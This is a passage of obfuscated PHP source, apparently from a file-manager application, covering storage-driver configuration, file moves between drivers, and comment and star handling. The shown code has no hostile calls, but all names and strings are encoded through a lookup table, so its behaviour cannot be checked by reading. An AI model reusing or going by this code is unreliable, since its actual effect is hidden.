unset($­Î¬Õí¡[$—ÉÓì¤][$¬¿ş·Óº[6]]); $­Î¬Õí¡[$—ÉÓì¤][$¬¿ş·Óº[1848]] = isset($ÈÏ¢›µ³[$·‘˜À´ˆ[$¬¿ş·Óº[437]]]) ? $ÈÏ¢›µ³[$·‘˜À´ˆ[$¬¿ş·Óº[437]]] : 0; } return $­Î¬Õí¡; } public function ioSizeUseGet($èìõÖÒ›) { $ŠÂí¸±â =& $_SERVER[¹òÍ›æş]; if (!$èìõÖÒ›) { return array(); } $Åçµ‡ş = $ŠÂí¸±â[2176] . implode($ŠÂí¸±â[50], $èìõÖÒ›); $á—ÜèîÉ = Cache::get($Åçµ‡ş); if ($á—ÜèîÉ) { return $á—ÜèîÉ; } $úòºÜÄ­ = array($ŠÂí¸±â[847] => $ŠÂí¸±â[437], $ŠÂí¸±â[2177] => $ŠÂí¸±â[86]); $¯óŞ²¸· = array($ŠÂí¸±â[847] => array($ŠÂí¸±â[7], $èìõÖÒ›)); $á—ÜèîÉ = Model($ŠÂí¸±â[819])->field($úòºÜÄ­)->where($¯óŞ²¸·)->group($ŠÂí¸±â[847])->select(); $á—ÜèîÉ = array_to_keyvalue($á—ÜèîÉ, $ŠÂí¸±â[437], $ŠÂí¸±â[86]); Cache::set($Åçµ‡ş, $á—ÜèîÉ, 600); return $á—ÜèîÉ; } public function getConfig($«‹‰ÑËã) { $Æ µÚĞ‘ = parent::listData($«‹‰ÑËã); return json_decode($Æ µÚĞ‘[$_SERVER[¹òÍ›æş][6]], !0); } public function update($‰Ãë²ÌÙ, $‰äñ«ÙÁ) { $ƒËæü€¸ =& $_SERVER[¹òÍ›æş]; $» ¬¸Í = $‰äñ«ÙÁ[$ƒËæü€¸[32]]; $òÕ¸ß¤ = array_to_keyvalue(parent::listData(), $ƒËæü€¸[32]); if (isset($òÕ¸ß¤[$» ¬¸Í]) && $òÕ¸ß¤[$» ¬¸Í][$ƒËæü€¸[437]] != $‰Ãë²ÌÙ) { return !1; } $this->checkPwd($‰Ãë²ÌÙ, $‰äñ«ÙÁ); if (isset($‰äñ«ÙÁ[$ƒËæü€¸[2178]]) && $‰äñ«ÙÁ[$ƒËæü€¸[2178]] == $ƒËæü€¸[98]) { $this->checkConfig($‰äñ«ÙÁ); } unset($‰äñ«ÙÁ[$ƒËæü€¸[2178]]); $¦è¤Üü— = parent::update($‰Ãë²ÌÙ, $‰äñ«ÙÁ); if ($¦è¤Üü— && $‰äñ«ÙÁ[$ƒËæü€¸[37]]) { $ö¢‘ã˜ = 0; foreach ($òÕ¸ß¤ as $æóãÆö) { if ($æóãÆö[$ƒËæü€¸[37]] && $æóãÆö[$ƒËæü€¸[437]] != $‰Ãë²ÌÙ) { $ö¢‘ã˜ = $æóãÆö[$ƒËæü€¸[437]]; parent::update($æóãÆö[$ƒËæü€¸[437]], array($ƒËæü€¸[37] => 0)); } } $this->updateBackup($‰Ãë²ÌÙ, $ö¢‘ã˜); } return $¦è¤Üü—; } public function add($¶´¤©À) { $é×Í£×Œ =& $_SERVER[¹òÍ›æş]; $ª¡çÏĞ = array_to_keyvalue(parent::listData(), $é×Í£×Œ[32]); if (isset($ª¡çÏĞ[$¶´¤©À[$é×Í£×Œ[32]]])) { return !1; } $this->checkConfig($¶´¤©À); $İøò°ğö = parent::insert($¶´¤©À); if ($İøò°ğö && $¶´¤©À[$é×Í£×Œ[37]]) { foreach ($ª¡çÏĞ as $¥üÑ½–¢) { if ($¥üÑ½–¢[$é×Í£×Œ[37]]) { parent::update($¥üÑ½–¢[$é×Í£×Œ[437]], array($é×Í£×Œ[37] => 0)); } } } return $İøò°ğö; } public function updateBackup($Ú·“ü», $Êàî¨çÔ) { $¶…°ƒ =& $_SERVER[¹òÍ›æş]; if (!$Êàî¨çÔ) { return; } $Ï±Ï‡‚á = Model($¶…°ƒ[779])->config(); if ($Ï±Ï‡‚á[$¶…°ƒ[1639]] != $¶…°ƒ[98] || $Ï±Ï‡‚á[$¶…°ƒ[781]] != $Êàî¨çÔ) { return; } $£ÊßËó¼ = Model($¶…°ƒ[800])->get($¶…°ƒ[810]); $£ÊßËó¼ = json_decode($£ÊßËó¼, !0); if (!$£ÊßËó¼) { return; } $£ÊßËó¼[$¶…°ƒ[781]] = $Ú·“ü»; Model($¶…°ƒ[800])->set(array($¶…°ƒ[810] => $£ÊßËó¼)); } public function checkPwd($¨Ìç¤Öô, &$ñòÙ½ÒÑ) { $äÊÌÇÓ =& $_SERVER[¹òÍ›æş]; if (empty($ñòÙ½ÒÑ[$äÊÌÇÓ[6]])) { return; } $µï¡·±¯ = json_decode($ñòÙ½ÒÑ[$äÊÌÇÓ[6]], !0); $ë¢Ç¾•õ = $äÊÌÇÓ[12]; $ûô–üˆø = array($äÊÌÇÓ[2179], $äÊÌÇÓ[2180], $äÊÌÇÓ[916]); foreach ($ûô–üˆø as $ÁËõ¬ô¹) { if (isset($µï¡·±¯[$ÁËõ¬ô¹])) { $ë¢Ç¾•õ = $ÁËõ¬ô¹; break; } } if (!$ë¢Ç¾•õ) { return; } $éÓªÍô€ = $this->getConfig($¨Ìç¤Öô); $Æşü›ö® = $éÓªÍô€[$ë¢Ç¾•õ]; $ëšµ çû = $µï¡·±¯[$ë¢Ç¾•õ]; if ($ëšµ çû == str_repeat($äÊÌÇÓ[199], strlen($Æşü›ö®))) { $µï¡·±¯[$ë¢Ç¾•õ] = $Æşü›ö®; $ñòÙ½ÒÑ[$äÊÌÇÓ[6]] = json_encode($µï¡·±¯); } else { if ($ëšµ çû != $Æşü›ö®) { $ñòÙ½ÒÑ[$äÊÌÇÓ[2178]] = $äÊÌÇÓ[98]; } } } public function checkConfig(&$¯Ÿ‰¬á­, $ÚÊÍøº’ = false) { $É¬à½Îû =& $_SERVER[¹òÍ›æş]; $ì—§ıª = strtolower($¯Ÿ‰¬á­[$É¬à½Îû[105]]); $››–Áø = json_decode($¯Ÿ‰¬á­[$É¬à½Îû[6]], !0); foreach ($››–Áø as $Ü•è‹×„ => $öñãÆÒÉ) { $››–Áø[$Ü•è‹×„] = trim($öñãÆÒÉ); } $››–Áø[$É¬à½Îû[2181]] = rand_string(6); $Ç²Ğğ¬§ = $GLOBALS[$É¬à½Îû[6]][$É¬à½Îû[99]][$É¬à½Îû[856]]; $¶÷æ®™á = isset($Ç²Ğğ¬§[$ì—§ıª]) ? $Ç²Ğğ¬§[$ì—§ıª] : ucfirst($ì—§ıª); $ÖÒ²–º– = $É¬à½Îû[84] . $¶÷æ®™á; if (!$¶÷æ®™á || !class_exists($ÖÒ²–º–)) { if ($ÚÊÍøº’) { return LNG($É¬à½Îû[2182]); } write_log(array($É¬à½Îû[2183], $¯Ÿ‰¬á­, get_caller_info()), $É¬à½Îû[2184]); show_json(LNG($É¬à½Îû[2182]), !1, $¯Ÿ‰¬á­); } $Å‰ş¯Œ¬ = new $ÖÒ²–º–($››–Áø); if (in_array($ì—§ıª, $Å‰ş¯Œ¬->objectDriver)) { if (!$Å‰ş¯Œ¬->isBucketCors() && !$Å‰ş¯Œ¬->setBucketCors()) { $İİ¹ëäÎ = LNG($É¬à½Îû[2185]); $İİ¹ëäÎ .= $É¬à½Îû[2186] . LNG($É¬à½Îû[2187]); if ($ÚÊÍøº’) { return $İİ¹ëäÎ; } show_json($İİ¹ëäÎ, !1); } } $„‘ã¯›µ = rtrim($››–Áø[$É¬à½Îû[1207]], $É¬à½Îû[8]) . $É¬à½Îû[8]; $¨¯ÛÙŸÍ = $Å‰ş¯Œ¬->getPath($„‘ã¯›µ . $É¬à½Îû[1211]); if (!$Å‰ş¯Œ¬->mkfile($¨¯ÛÙŸÍ)) { if ($ÚÊÍøº’) { return LNG($É¬à½Îû[2185]); } show_json(LNG($É¬à½Îû[2185]), !1); } $››–Áø[$É¬à½Îû[1207]] = $„‘ã¯›µ; $¯Ÿ‰¬á­[$É¬à½Îû[6]] = json_encode($››–Áø); $¯Ÿ‰¬á­[$É¬à½Îû[105]] = $¶÷æ®™á; return !0; } public function driverListSystem() { $ì‰¸ıŒ— =& $_SERVER[¹òÍ›æş]; $Ğ–İŠ‹ø = parent::listData(); $Ì©ïÒĞñ = array(); foreach ($Ğ–İŠ‹ø as $ƒîˆ«‡€) { unset($ƒîˆ«‡€[$ì‰¸ıŒ—[211]], $ƒîˆ«‡€[$ì‰¸ıŒ—[95]]); $ƒîˆ«‡€[$ì‰¸ıŒ—[6]] = json_decode($ƒîˆ«‡€[$ì‰¸ıŒ—[6]], !0); $Ì©ïÒĞñ[] = $ƒîˆ«‡€; } return $Ì©ïÒĞñ; } public function defaultDriver() { $åã÷îŞÆ =& $_SERVER[¹òÍ›æş]; $¦ß™ÂÆ„ = parent::listData(); $Ô™›¿»© = array_filter_by_field($¦ß™ÂÆ„, $åã÷îŞÆ[37], 1); $Ô™›¿»© = $Ô™›¿»©[0]; if ($Ô™›¿»©) { $Ô™›¿»©[$åã÷îŞÆ[6]] = json_decode($Ô™›¿»©[$åã÷îŞÆ[6]], !0); } return $Ô™›¿»©; } public function driverInfo($“¡£¡É) { $‡‹—Ÿ½î =& $_SERVER[¹òÍ›æş]; $šãøÎø¦ = array_to_keyvalue(parent::listData(), $‡‹—Ÿ½î[437]); if (!isset($šãøÎø¦[$“¡£¡É])) { return !1; } $­­’˜àâ = $šãøÎø¦[$“¡£¡É]; $­­’˜àâ[$‡‹—Ÿ½î[6]] = json_decode($­­’˜àâ[$‡‹—Ÿ½î[6]], !0); return $­­’˜àâ; } public function remove($­ì¬‰ªá) { $this->removeShareItems($­ì¬‰ªá); return parent::remove($­ì¬‰ªá); } public function removeWithFile($´ˆÊ¢, $í·´ß¡) { $¯œöû¨å =& $_SERVER[¹òÍ›æş]; $ì¤Ç´¡« = array($¯œöû¨å[847] => $´ˆÊ¢); $ÃôË© = Model($¯œöû¨å[509])->where($ì¤Ç´¡«)->count(); $ÙÜ³¾‘¯ = Model($¯œöû¨å[509])->where($ì¤Ç´¡«)->sum($¯œöû¨å[86]); $úÙŞ…³— = $í·´ß¡ . $¯œöû¨å[2188] . $´ˆÊ¢; $Ú¯ŞÈ¸  = LNG($í·´ß¡ == $¯œöû¨å[586] ? $¯œöû¨å[2189] : $¯œöû¨å[2190]); $¨ı­îÒÁ = new TaskFileTransfer($úÙŞ…³—, $¯œöû¨å[2184], $ÃôË©, $Ú¯ŞÈ¸  . "\x28{$´ˆÊ¢}\x29"); $¨ı­îÒÁ->task[$¯œöû¨å[793]] = (double) $ÙÜ³¾‘¯; $²·È“ÆÍ = KodIO::defaultDriver(); $›õï€«ş = $²·È“ÆÍ[$¯œöû¨å[437]]; $²¬äÛë = "\x7b\151\157\72{$›õï€«ş}\175\57"; $‚à¦ØÍ = !0; $Öœ³Ôßù = array(); $á‡‹ìÒ° = Model($¯œöû¨å[210])->where($ì¤Ç´¡«)->field($¯œöû¨å[2191])->select(); foreach ($á‡‹ìÒ° as $˜ÔºÑ©Ë) { $ŒĞ¹Ô¾« = $˜ÔºÑ©Ë[$¯œöû¨å[94]]; $úÉ¥ÜÑ— = $²¬äÛë . str_replace("\x7b\151\157\x3a{$´ˆÊ¢}\175\x2f", $¯œöû¨å[12], $ŒĞ¹Ô¾«); if (!IO::exist($ŒĞ¹Ô¾«)) { $Öœ³Ôßù[] = $˜ÔºÑ©Ë[$¯œöû¨å[506]]; $¨ı­îÒÁ->updateFileEnd($˜ÔºÑ©Ë[$¯œöû¨å[32]], $˜ÔºÑ©Ë[$¯œöû¨å[86]]); continue; } if (IO::exist($úÉ¥ÜÑ—)) { $¨ı­îÒÁ->updateFileEnd($˜ÔºÑ©Ë[$¯œöû¨å[32]], $˜ÔºÑ©Ë[$¯œöû¨å[86]]); continue; } if (!IO::move($ŒĞ¹Ô¾«, get_path_father($úÉ¥ÜÑ—))) { $‚à¦ØÍ = !1; break; } $ì¤Ç´¡« = array($¯œöû¨å[506] => $˜ÔºÑ©Ë[$¯œöû¨å[506]]); $µïÀÛÖ = array($¯œöû¨å[847] => $›õï€«ş, $¯œöû¨å[94] => $úÉ¥ÜÑ—); Model($¯œöû¨å[210])->where($ì¤Ç´¡«)->save($µïÀÛÖ); } $this->removeByFileID($Öœ³Ôßù); if (!$‚à¦ØÍ) { $¨ı­îÒÁ->stop($úÙŞ…³—); return !1; } $¨ı­îÒÁ->end(); if ($í·´ß¡ == $¯œöû¨å[1828]) { $this->remove($´ˆÊ¢); } } public function progress($›Š…·ÑÃ, $õæ•ÖØš) { return Task::get($õæ•ÖØš . $_SERVER[¹òÍ›æş][2188] . $›Š…·ÑÃ); } private function removeByFileID($¶Ó¤‘ = array()) { $¶Ş»®â =& $_SERVER[¹òÍ›æş]; if (empty($¶Ó¤‘)) { return; } $ÁÍè½Ø = array($¶Ş»®â[506] => array($¶Ş»®â[7], $¶Ó¤‘)); $É˜š£Æí = Model($¶Ş»®â[1360])->where($ÁÍè½Ø)->field($¶Ş»®â[440])->select(); if (!$É˜š£Æí) { return; } $É˜š£Æí = array_to_keyvalue($É˜š£Æí, $¶Ş»®â[12], $¶Ş»®â[440]); foreach ($É˜š£Æí as $¹ì‹’˜) { Model($¶Ş»®â[454])->removeNow($¹ì‹’˜, !1); } } private function removeShareItems($­™õŞÖ§) { $‹×Şì¹ş =& $_SERVER[¹òÍ›æş]; $¨É‚ï©‰ = "\173\x69\157\x3a{$­™õŞÖ§}\x7d\57"; $¾Ó˜êûü = array($‹×Şì¹ş[440] => 0, $‹×Şì¹ş[1202] => array($‹×Şì¹ş[421], "{$¨É‚ï©‰}\x25")); $•ÈÓõ±º = Model($‹×Şì¹ş[1839])->where($¾Ó˜êûü)->field($‹×Şì¹ş[631])->select(); if (empty($•ÈÓõ±º)) { return; } $³—öëì = array_to_keyvalue($•ÈÓõ±º, $‹×Şì¹ş[12], $‹×Şì¹ş[631]); Model($‹×Şì¹ş[630])->remove($³—öëì); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\114\x69\147\150\x74\x41\x70\x70"; public $modelType = "\123\171\x73\x74\145\x6d\x4f\160\x74\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\147\x72\x6f\x75\160", "\144\145\163\x63", "\x63\157\x6e\x74\145\x6e\164"); public function listData($ŸæóùÖ· = false, $ Ø°®£  = "\155\x6f\x64\x69\146\171\x54\151\x6d\145", $ ›±êÆ‘ = true) { return parent::listData($ŸæóùÖ·, $ Ø°®£ , $ ›±êÆ‘); } public function remove($îÇ¨“ó) { $ıİ¹”•Á = $this->findByName($îÇ¨“ó); if (!$ıİ¹”•Á) { return !1; } return parent::remove($ıİ¹”•Á[$_SERVER[¹òÍ›æş][437]]); } public function add($ß›š¿Êë) { if ($this->findByName($ß›š¿Êë[$_SERVER[¹òÍ›æş][32]])) { return !1; } return parent::insert($ß›š¿Êë); } public function update($Œô¬÷šĞ, $Ûîİ–é») { $“›Áï¤• =& $_SERVER[¹òÍ›æş]; $Ã©¦«ñ‡ = $this->findByName($Œô¬÷šĞ); $¢‡øñ‚ = $this->findByName($Ûîİ–é»[$“›Áï¤•[32]]); if (!$Ã©¦«ñ‡ || $¢‡øñ‚ && $¢‡øñ‚[$“›Áï¤•[437]] != $Ã©¦«ñ‡[$“›Áï¤•[437]]) { return !1; } return parent::update($Ã©¦«ñ‡[$“›Áï¤•[437]], $Ûîİ–é»); } } goto E¯Ò¹–ÃÅ; bÅôç­„†Ú: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\x65" => "\143\157\x6d\155\145\156\164\137\x6d\x65\164\141", "\x6d\145\x74\141\106\151\145\154\144" => "\143\157\x6d\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ùÍŒÖÊç) { $ŸÊŸª…º =& $_SERVER[¹òÍ›æş]; if ($ùÍŒÖÊç[$ŸÊŸª…º[1888]]) { $Øò¼Ïá = $this->where(array($ŸÊŸª…º[1889] => $ùÍŒÖÊç[$ŸÊŸª…º[1888]]))->find(); if (!$Øò¼Ïá || $Øò¼Ïá[$ŸÊŸª…º[449]] != $ùÍŒÖÊç[$ŸÊŸª…º[449]] || $Øò¼Ïá[$ŸÊŸª…º[534]] != $ùÍŒÖÊç[$ŸÊŸª…º[534]]) { return !1; } $this->where(array($ŸÊŸª…º[1889] => $ùÍŒÖÊç[$ŸÊŸª…º[1888]]))->setAdd($ŸÊŸª…º[1890], 1); } $ùÍŒÖÊç[$ŸÊŸª…º[1891]] = 0; $ùÍŒÖÊç[$ŸÊŸª…º[1890]] = 0; $ùÍŒÖÊç[$ŸÊŸª…º[780]] = 1; return $this->add($ùÍŒÖÊç); } public function commentCount($ÂŸš˜, $ÃüëÁƒÜ, $úîÓùÖ™ = false) { $ôØœÁœÖ =& $_SERVER[¹òÍ›æş]; if (!$ÂŸš˜) { return array(); } if (is_string($ÂŸš˜) || is_int($ÂŸš˜)) { $ÂŸš˜ = array($ÂŸš˜); } $ëà¤®ĞÈ = array($ôØœÁœÖ[534], $ôØœÁœÖ[1892] => $ôØœÁœÖ[529]); $š§‡îó÷ = array($ôØœÁœÖ[534] => array($ôØœÁœÖ[7], $ÂŸš˜), $ôØœÁœÖ[449] => $ÃüëÁƒÜ); if ($úîÓùÖ™) { $š§‡îó÷[$ôØœÁœÖ[1669]] = $úîÓùÖ™; } $¿Šˆ„¯Á = $this->field($ëà¤®ĞÈ)->where($š§‡îó÷)->group($ôØœÁœÖ[534])->select(); return array_to_keyvalue($¿Šˆ„¯Á, $ôØœÁœÖ[534], $ôØœÁœÖ[529]); } public function starTarget($…û³óıª, $ÈŠ˜¾•’) { $óòÁØæ =& $_SERVER[¹òÍ›æş]; $æöÇïµâ = $…û³óıª + self::TYPE_STAR_OFFSET; $ë££µ±â = array($óòÁØæ[1669] => USER_ID, $óòÁØæ[449] => $æöÇïµâ, $óòÁØæ[534] => $ÈŠ˜¾•’); $ã´”óç = $this->where($ë££µ±â)->find(); if ($ã´”óç) { return $this->where(array($óòÁØæ[437] => $ã´”óç[$óòÁØæ[437]]))->delete(); } $Î“Ê‡“ö = array($óòÁØæ[1888] => 0, $óòÁØæ[1669] => USER_ID, $óòÁØæ[780] => 1, $óòÁØæ[784] => $óòÁØæ[12], $óòÁØæ[449] => $æöÇïµâ, $óòÁØæ[534] => $ÈŠ˜¾•’, $óòÁØæ[1891] => 0, $óòÁØæ[1890] => 0); return $this->add($Î“Ê‡“ö); } public function starTargetCount($ß©åÎ¿, $Â½“®Ã) { $ö€¨¿»³ =& $_SERVER[¹òÍ›æş]; $õ­Ç—µÇ = $Â½“®Ã + self::TYPE_STAR_OFFSET; $ÖÄÉ‡‡ = $this->commentCount($ß©åÎ¿, $õ­Ç—µÇ); $ÕÑîÃÆğ = $this->commentCount($ß©åÎ¿, $õ­Ç—µÇ, USER_ID); return array($ö€¨¿»³[1893] => $ÖÄÉ‡‡, $ö€¨¿»³[1894] => $ÕÑîÃÆğ); } public function starTargetUserList($›êŠ„Ğ, $èÌĞñºË) { $ğú’•öŞ =& $_SERVER[¹òÍ›æş]; $ñ»„Œ±§ = $›êŠ„Ğ + self::TYPE_STAR_OFFSET; $¸åı¬ÎØ = array($ğú’•öŞ[534] => $èÌĞñºË, $ğú’•öŞ[449] => $ñ»„Œ±§); $’à´¯ìï = $this->where($¸åı¬ÎØ)->count(); $‡´Îı¶ = array($ğú’•öŞ[293] => $’à´¯ìï, $ğú’•öŞ[1895] => array()); if (!$’à´¯ìï) { return $‡´Îı¶; } $½‚·›î = $this->field($ğú’•öŞ[1669])->where($¸åı¬ÎØ)->limit(500)->select(); $½‚·›î = array_to_keyvalue($½‚·›î, $ğú’•öŞ[12], $ğú’•öŞ[1669]); $‡´Îı¶[$ğú’•öŞ[1895]] = Model($ğú’•öŞ[542])->userListInfo($½‚·›î); return $‡´Îı¶; } public function prasiseUserList($åËÒÉÊ) { $Ñ—¡Í“Ø =& $_SERVER[¹òÍ›æş]; $ƒ”İÑêµ = array($Ñ—¡Í“Ø[1896] => $åËÒÉÊ); $»œÃã¤ = $this->where($ƒ”İÑêµ)->find(); $ü‘ÓüÎ = _get($»œÃã¤, $Ñ—¡Í“Ø[1891], 0); $½¥Ü¯ôµ = array($Ñ—¡Í“Ø[293] => $ü‘ÓüÎ, $Ñ—¡Í“Ø[1895] => array()); if (!$ü‘ÓüÎ) { return $½¥Ü¯ôµ; } $ö™ ÌÔ² = Model($Ñ—¡Í“Ø[1897])->field($Ñ—¡Í“Ø[1669])->where($ƒ”İÑêµ)->limit(500)->select(); $ö™ ÌÔ² = array_to_keyvalue($ö™ ÌÔ², $Ñ—¡Í“Ø[12], $Ñ—¡Í“Ø[1669]); $½¥Ü¯ôµ[$Ñ—¡Í“Ø[1895]] = Model($Ñ—¡Í“Ø[542])->userListInfo($ö™ ÌÔ²); return $½¥Ü¯ôµ; } public function remove($›Ó™Öù) { $—çæÒ”¯ =& $_SERVER[¹òÍ›æş]; $Àç¢İ•Ë = array($—çæÒ”¯[1889] => $›Ó™Öù); $÷ß‚úÉ™ = $this->where($Àç¢İ•Ë)->find(); if ($÷ß‚úÉ™[$—çæÒ”¯[1888]]) { $this->where(array($—çæÒ”¯[1889] => $÷ß‚úÉ™[$—çæÒ”¯[1888]]))->setAdd($—çæÒ”¯[1890], -1); } return $this->where($Àç¢İ•Ë)->delete(); } public function edit($¥ô§Í, $Á¸èÚ˜“) { $ëÊöÍÑŒ =& $_SERVER[¹òÍ›æş]; $ØÎ×ªÎ = array($ëÊöÍÑŒ[1889] => $¥ô§Í); return $this->where($ØÎ×ªÎ)->save(array($ëÊöÍÑŒ[1898] => $Á¸èÚ˜“)); } public function prasise($âïê¬Â³) { $¼ª¶ô =& $_SERVER[¹òÍ›æş]; $±ßõŸÔ– = Model($¼ª¶ô[1899]); $Œ¡ûÆË = array($¼ª¶ô[1889] => $âïê¬Â³, $¼ª¶ô[1660] => USER_ID); $æ¢Ûóí¥ = $±ßõŸÔ–->where($Œ¡ûÆË)->find(); if (!$æ¢Ûóí¥) { $±ßõŸÔ–->add($Œ¡ûÆË); $¬­‡“ö = $this->where(array($¼ª¶ô[1889] => $âïê¬Â³))->setAdd($¼ª¶ô[1891], 1); } else { $±ßõŸÔ–->where($Œ¡ûÆË)->delete(); $¬­‡“ö = $this->where(array($¼ª¶ô[1889] => $âïê¬Â³))->setAdd($¼ª¶ô[1891], -1); } return $¬­‡“ö; } public function targetInfo($¡¿¯êÛĞ, $ø†ÄäØ) { $Åƒ¥ú˜Ş =& $_SERVER[¹òÍ›æş]; $Ô¶ÆËâ˜ = array($Åƒ¥ú˜Ş[614] => $¡¿¯êÛĞ, $Åƒ¥ú˜Ş[615] => $ø†ÄäØ); $ıïÈşÛ± = $this->where($Ô¶ÆËâ˜)->count(); $å‰®¹¡ = "\122\x49\x47\x48\x54\40\112\117\111\116\x20{$this->tablePrefix}\143\157\155\155\x65\x6e\164\137\160\x72\x61\x69\163\145\x20\x73\164\141\162\40\157\x6e\x20\x63\157\155\155\x65\x6e\164\x2e\x63\157\155\155\145\x6e\164\111\x44\x20\x3d\x20\163\164\141\x72\56\143\x6f\x6d\155\x65\156\164\x49\x44"; $ìœ¾»õ = $this->alias($Åƒ¥ú˜Ş[392])->where($Ô¶ÆËâ˜)->join($å‰®¹¡, $Åƒ¥ú˜Ş[1900])->count(); $è¥åŠÙ = array($Åƒ¥ú˜Ş[1901] => $ıïÈşÛ±, $Åƒ¥ú˜Ş[1902] => $ìœ¾»õ); return $è¥åŠÙ; } public function listData($¿±„ªÄè) { $ËÖÁä =& $_SERVER[¹òÍ›æş]; if (isset($¿±„ªÄè[$ËÖÁä[1903]])) { if ($¿±„ªÄè[$ËÖÁä[1903]]) { $¿±„ªÄè[$ËÖÁä[1896]] = array($ËÖÁä[1041], intval($¿±„ªÄè[$ËÖÁä[1903]])); } unset($¿±„ªÄè[$ËÖÁä[1903]]); } if (isset($¿±„ªÄè[$ËÖÁä[1904]])) { if ($¿±„ªÄè[$ËÖÁä[1904]]) { $¿±„ªÄè[$ËÖÁä[1896]] = array($ËÖÁä[1038], intval($¿±„ªÄè[$ËÖÁä[1904]])); } unset($¿±„ªÄè[$ËÖÁä[1904]]); } return $this->_listData($¿±„ªÄè); } private function _listData($ÓÓîÄÚ) { $Ñšùû˜± =& $_SERVER[¹òÍ›æş]; $¿¨Ì‹ü¼ = $this->where($ÓÓîÄÚ)->_makeOrder()->selectPage(100); $this->_listAppendParent($¿¨Ì‹ü¼[$Ñšùû˜±[407]]); $this->_listAppendUser($¿¨Ì‹ü¼[$Ñšùû˜±[407]]); $this->_listAppendMeta($¿¨Ì‹ü¼[$Ñšùû˜±[407]]); return $¿¨Ì‹ü¼; } private function _makeOrder() { $‹¤ô€õÀ =& $_SERVER[¹òÍ›æş]; $şûâµ²÷ = array($‹¤ô€õÀ[1891], $‹¤ô€õÀ[1890], $‹¤ô€õÀ[211]); $·¹Àç¼ = Input::get($‹¤ô€õÀ[495], $‹¤ô€õÀ[7], $‹¤ô€õÀ[461], $şûâµ²÷); $ıó·¹Øƒ = Input::get($‹¤ô€õÀ[496], $‹¤ô€õÀ[7], $‹¤ô€õÀ[1662], array($‹¤ô€õÀ[1905], $‹¤ô€õÀ[491])); $¥å†…ÌÊ = $·¹Àç¼ . $‹¤ô€õÀ[53] . $ıó·¹Øƒ; return $this->order($¥å†…ÌÊ); } private function _listAppendParent(&$ªÔşĞè‰) { $Âˆ®Ê² =& $_SERVER[¹òÍ›æş]; $ˆ½–Áäù = array_unique(array_to_keyvalue($ªÔşĞè‰, $Âˆ®Ê²[12], $Âˆ®Ê²[1888])); $ˆ½–Áäù = array_remove_value($ˆ½–Áäù, $Âˆ®Ê²[208]); if (!$ˆ½–Áäù) { return; } $ÍÔøº = $this->where(array($Âˆ®Ê²[1889] => array($Âˆ®Ê²[7], $ˆ½–Áäù)))->select(); $ÍÔøº = array_to_keyvalue($ÍÔøº, $Âˆ®Ê²[1896]); foreach ($ªÔşĞè‰ as &$ş™¡ÎŞé) { if (isset($ÍÔøº[$ş™¡ÎŞé[$Âˆ®Ê²[1888]]])) { $ş™¡ÎŞé[$Âˆ®Ê²[1906]] = $ÍÔøº[$ş™¡ÎŞé[$Âˆ®Ê²[1888]]]; } } unset($ş™¡ÎŞé); } private function _listAppendUser(&$³ëğ¹) { $¢´ÆÉ  =& $_SERVER[¹òÍ›æş]; $¦Û¹ªŞ· = array_unique(array_to_keyvalue($³ëğ¹, $¢´ÆÉ [12], $¢´ÆÉ [1669])); $¦Û¹ªŞ· = array_remove_value($¦Û¹ªŞ·, $¢´ÆÉ [208]); if (count($¦Û¹ªŞ·) == 0) { return; } foreach ($³ëğ¹ as $ª’“°æá) { if (isset($ª’“°æá[$¢´ÆÉ [1906]])) { $¦Û¹ªŞ·[] = $ª’“°æá[$¢´ÆÉ [1906]][$¢´ÆÉ [1669]]; } } $‡ìÀÛŞÊ = Model($¢´ÆÉ [563])->userListInfo($¦Û¹ªŞ·); foreach ($³ëğ¹ as &$ª’“°æá) { $ª’“°æá[$¢´ÆÉ [628]] = $‡ìÀÛŞÊ[$ª’“°æá[$¢´ÆÉ [1669]]]; if (isset($ª’“°æá[$¢´ÆÉ [1906]])) { $ª’“°æá[$¢´ÆÉ [1906]][$¢´ÆÉ [628]] = $‡ìÀÛŞÊ[$ª’“°æá[$¢´ÆÉ [1906]][$¢´ÆÉ [1669]]]; } } unset($ª’“°æá); } private function _listAppendMeta(&$ğ‚™€´Á) { $™çİÇ€Ø =& $_SERVER[¹òÍ›æş]; $òÙÈâïÏ = array_unique(array_to_keyvalue($ğ‚™€´Á, $™çİÇ€Ø[12], $™çİÇ€Ø[1896])); $òÙÈâïÏ = array_remove_value($òÙÈâïÏ, $™çİÇ€Ø[208]); if (!$òÙÈâïÏ) { return; } foreach ($ğ‚™€´Á as $“°¦ŞäÍ) { if (isset($“°¦ŞäÍ[$™çİÇ€Ø[1906]])) { $òÙÈâïÏ[] = $“°¦ŞäÍ[$™çİÇ€Ø[1906]][$™çİÇ€Ø[1896]]; } } $¡¦¥¤à¸ = $this->metaList($òÙÈâïÏ); if (!$¡¦¥¤à¸) { return !1; } foreach ($ğ‚™€´Á as &$“°¦ŞäÍ) { $“°¦ŞäÍ[$™çİÇ€Ø[504]] = $¡¦¥¤à¸[$“°¦ŞäÍ[$™çİÇ€Ø[1896]]]; if (isset($“°¦ŞäÍ[$™çİÇ€Ø[1906]])) { $“°¦ŞäÍ[$™çİÇ€Ø[1906]][$™çİÇ€Ø[504]] = $¡¦¥¤à¸[$“°¦ŞäÍ[$™çİÇ€Ø[1906]][$™çİÇ€Ø[1896]]]; } } unset($“°¦ŞäÍ); } private function metaList($ƒ‚á Õ÷) { $êÛË·¶‚ =& $_SERVER[¹òÍ›æş]; if (!$ƒ‚á Õ÷) { return array(); } $¥­”¤º = array($êÛË·¶‚[1896] => array($êÛË·¶‚[7], $ƒ‚á Õ÷)); $½¹ÁªŞğ = Model($êÛË·¶‚[1907])->where($¥­”¤º)->select(); $½¹ÁªŞğ = array_to_keyvalue_group($½¹ÁªŞğ, $êÛË·¶‚[1896]); foreach ($½¹ÁªŞğ as $½Œ±ëÎ => $¢èî³¨Ï) { $‚ÑÒÂß = array(); foreach ($¢èî³¨Ï as $ë²®Ã•) { $‚ÑÒÂß[$ë²®Ã•[$êÛË·¶‚[104]]] 